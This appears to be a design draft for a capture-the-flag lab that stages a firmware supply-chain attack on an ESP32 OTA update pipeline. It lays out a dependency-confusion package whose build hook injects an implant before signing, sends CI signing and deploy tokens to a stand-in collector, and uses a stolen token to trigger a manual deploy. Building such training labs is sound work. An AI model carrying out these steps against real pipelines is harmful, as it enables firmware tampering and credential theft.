# TECH-OTA, the OTA update mechanism, technical draft
Companion to CHALLENGE.md v0.7 · draft v0.1 (2026-09-11)
Covers: pipeline → OTA server → device client → attack surface → forensics
Target hardware: ESP32-DevKitC (WROOM-32, external 4 MB SPI flash)

## 0. Design goals

1. The update path must be INDISTINGUISHABLE from a real vendor OTA flow:
   signed manifests, dual-bank A/B update, verify-before-apply, automatic
   rollback. Nothing about the mechanism is fake except the endpoints.
2. Every stage must produce a forensic artifact (build log, server access
   log, manifest history, flash bytes, device serial log).
3. Everything binds to 127.0.0.1. No real registry, no real OTA host.
4. The same protocol runs in both tiers: the ESP32 client (real board)
   and the virtual device container (Python) speak identical HTTP.

## 1. Topology

  +--------------------- GitLab CI (runner) ---------------------+
  |  build -> test -> SIGN -> deploy                              |
  |     |               |          |                              |
  |  pip install        ed25519    POST manifest+image          |
  |  (dep confusion     sign key   (OTA push token)             |
  |   happens HERE)    (CI var)         |                         |
  +------------------------------------|--------------------------+
                                       v
                    +----------- OTA server (localhost) -----------+
                    |  /manifest.json   (version, sha256, ed25519  |
                    |                    sig over manifest)        |
                    |  /firmware/<ver>.bin   (padded app image)    |
                    |  append-only manifest history (forensics)    |
                    +-------------------|--------------------------+
                                        v  GET (poll every 30 s)
                    +---------------- device ----------------------+
                    |  real: ESP32 + esp-idf ota client            |
                    |  virtual: python container, flash.img file   |
                    |  download -> verify -> write bank -> boot    |
                    +-------------------|--------------------------+
                                        v  beacon (timer)
                    +---------- C2 collector (localhost) ----------+

## 2. Firmware image and flash layout (4 MB)

Partition table (both tiers use the same layout so the flash diff is
meaningful across tiers):

  nvs        0x009000  0x005000
  otadata    0x00e000  0x002000
  app_a      0x010000  0x1F0000   (ota_0)
  app_b      0x200000  0x1F0000   (ota_1)
  coredump   0x3F0000  0x010000

Virtual tier: flash.img is a plain 4 MB file with identical offsets ,
the virtual device is literally a mmap() of it, so `dd`/`cmp` forensics
is byte-identical to what the CH341A clip would pull off the real board.

## 3. Signing scheme

Lab-grade but structurally honest, we mirror what esp_https_ota does
with CONFIG_SECURE_SIGNED_APPS_RSA_SCHEME, simplified to ed25519:

  signing key     : ed25519 keypair, vendor generates at seed time
  CI variable     : SIGNING_KEY (private, masked) + SIGNING_PUB
  image signing   : sig = ed25519_sign(sha256(app_image_padded))
  where it lives  : signature APPENDED to the padded image
                    (last 64 B) AND duplicated in the manifest
  device verify   : sha256(image minus sig) + ed25519 verify against
                    SIGNING_PUB burned into the client config

Pad the app image to the full partition size (0x1F0000) before hashing.
This gives P4 its payoff: the implant bytes sit at a known offset inside
a signed image, so the diff vs the release artifact is byte-exact and
the signature is still valid, the whole "signature proves origin, not
safety" beat in the physical layer.

## 4. OTA protocol (server ↔ device)

Manifest (versioned, append-only on the server):

  {
    "version"   : "1.4.3",              // semver of the app
    "build_id"  : "<gitlab pipeline id>",
    "sha256"    : "<hex of padded+signed image>",
    "ed25519"   : "<hex sig over manifest sans this field>",
    "size"      : 2031616,
    "ts"        : 1726012345
  }

Device poll loop (every 30 s, configurable):

  1. GET  /manifest.json
  2. verify manifest ed25519 sig (device-trusted vendor pub key)
  3. if version <= running_version: sleep, goto 1
  4. GET  /firmware/<version>.bin, stream to the INACTIVE bank
  5. sha256 the downloaded bank, compare to manifest sha256
  6. write otadata -> point boot at the new bank; reboot
  7. new app runs self-check, then
     esp_ota_mark_app_valid_cancel_rollback()   [real]
     setstate valid                              [virtual]
  8. if the watchdog/self-check fails, otadata falls back to the
     previous bank automatically (rollback as designed)

Note what step 2+5 CANNOT catch: a wrong-but-validly-signed image.
That is the teaching point the mechanism is built to demonstrate.

## 5. The vendor pipeline (seeded by seed.sh)

.gitlab-ci.yml stages: [build, sign, deploy] (the test runs INSIDE the
build job, between build and install):

  build:
    - pip config: index-url = internal devpi; EXTRA_INDEX_URL = public
      devpi            <-- the one-line misconfiguration (P1 flag)
    - python build_fw.py   /  idf.py build   [virtual]
    - pad image to partition size -> app_padded.bin, export FW_IMAGE
    - python test_fw.py   # release tests: the still-clean image passes
    - pip install -r requirements.txt     # doorbellino-hal==>=1.4,<3
      <-- AFTER build+test: whatever the dependency's build hook writes
      into app_padded.bin lands between the tests and the signature
  sign:
    - python sign_fw.py --key "$SIGNING_KEY" --pub "$SIGNING_PUB" app_padded.bin
    - artifact: firmware-signed.bin + manifest.json (version ladder:
      ships served + 1)
  deploy:                          # manual gate in the honest world
    - when: manual                 # played from outside with the looted
    - script: ota_push.py --token "$OTA_PUSH_TOKEN" \
                firmware-signed.bin manifest.json
                                   # trigger token: it deploys whatever
                                   # the build stages produced

Server side: ota_push.py POSTs manifest+image with a bearer token
(OTA_PUSH_TOKEN, masked CI variable). Server validates token, appends
to manifest history, serves from then on. Manifest history (who pushed
what, when, from which pipeline) is P4 timeline evidence.

## 6. The attack surface, where the poison enters

Player publishes doorbellino-hal 2.0.7 to the PUBLIC devpi only.
Because pip merges both indexes and prefers the higher semver, the
vendor's `pip install` in the build stage fetches the attacker's
sdist. Its setup.py declares:

  cmdclass={"build_py": EvilBuild}      # runs ON THE RUNNER

EvilBuild.run() does, in order:

  1. INJECT  locate the artifact of the build stage (the vendor CI
     builds BEFORE installing the dependency, so the just-built
     app_padded.bin exists at hook time), write implant.bin and its
     config block (collector URL, interval) at the implant offset:
     the bytes land AFTER the release tests, BEFORE the signature.
  2. EXFIL   os.environ["SIGNING_KEY"], os.environ["OTA_PUSH_TOKEN"],
     os.environ["GITLAB_TRIGGER_TOKEN"]
     -> POST to the collector:6xxx/loot. (The collector log is P4
     evidence; nothing leaves localhost.)
  3. HIJACK  the deploy stage is `when: manual`; the hook calls the
     GitLab API with the looted trigger token to PLAY the deploy job.
     Mid-pipeline GitLab refuses (HTTP 400): the gate holds from
     inside, and the deferred line in dbg-hook.txt is the evidence.
     The play is finished from OUTSIDE the pipeline with the same
     looted token, which now authorizes the gate to deploy the
     poisoned, vendor-signed image. (The no-pipeline fallback ships
     the same poison with the stolen SIGNING_KEY + OTA_PUSH_TOKEN.)

Result: the SIGN stage signs the implant-carrying image with the
vendor key (it runs AFTER the injection), the played gate deploys it,
the OTA server serves the poisoned manifest, and the
device applies it within one poll interval. The only human gate, the
manual deploy click, was replaced by a looted token.

Stage-order subtlety worth keeping: injection happens at BUILD time,
signing at SIGN time, so the malicious bytes are inside the signed
image. If injection happened post-sign, the sha256 check would fail.
The lab must preserve this order; it is why the hook is a build hook
and not a test hook.

## 7. The implant (deliberately minimal)

Single C/py module linked into the app (real) or imported by the
virtual runtime:

  - config block at fixed offset: collector_host, collector_port,
    beacon_interval (30 s), device_id (efuse/mac)
  - beacon frame: {"id", "fw_ver" (LIES: "1.4.2"), "key_fpr"} ,
    the version lie from TALK part 5, reproduced over the wire
  - transport: plain HTTP POST to the collector; in the real tier a
    raw socket, no TLS, so tcpdump on the lab net shows it verbatim

## 8. Forensics map (what P4 touches, where each fact lives)

  artifact                         proves
  -------------------------------  ----------------------------------
  pip resolution log line          public beat internal (P2 flag)
  GitLab job list + timestamps     deploy job PLAYED w/o human (P2)
  collector /loot entry            key + OTA token exfiltrated
  OTA manifest history             poisoned manifest + pusher identity
  device serial log                verify PASSED, applied, beaconing
  flash dump vs release artifact   implant bytes at offset X (P4 core)
  sha256 manifest vs recomputed    signature valid on poisoned image
  beacon frames in collector       what the implant DOES, on the wire

Timeline flag = the player orders these events correctly in causal
order (resolve < inject < exfil < sign < play < manifest < apply <
beacon).

## 9. Virtual device implementation notes

- One container, one flash.img, one runtime loop:
  poll OTA -> on update: verify -> write INACTIVE bank range in the
  mmap -> flip otadata bytes -> "reboot" (reload running image from
  the bank otadata points to) -> beacon loop.
- Serial console = container stdout, reading version from the RUNNING
  image bytes, so it lies exactly like the real console would.
- Same ed25519 verify code path as the board (shared module), so a
  player's P5 provenance fix behaves identically in both tiers.

## 10. Lab invariants

- both devpi registries, OTA server, collector: 127.0.0.1 bindings only
- no egress: compose network has no default route out (internal: true)
- signing/OTA tokens are seeded per-run, 32 B random, never committed
- the public devpi accepts publish only from inside the compose net
- guide repeats: publishing to real registries requires authorization

## 11. Open items

1. esp-idf version pin (5.x) + whether to use stock esp_https_ota or
   the simplified custom client (draft assumes custom, fewer config
   knobs, identical structure, easier to mirror in Python).
2. Implant offset: fixed vs derived-from-partition-table (fixed is
   friendlier for the diff worksheet; derived is more realistic ,
   default: fixed, documented as "how the artifact looks").
3. Rollback behavior in the poisoned case must NOT trigger (implant
   passes self-check), needs a test so the demo never flops live.
4. GitLab trigger-token vs project-token for the deploy hijack: pick
   one, document both defects in the P1 recon sheet.
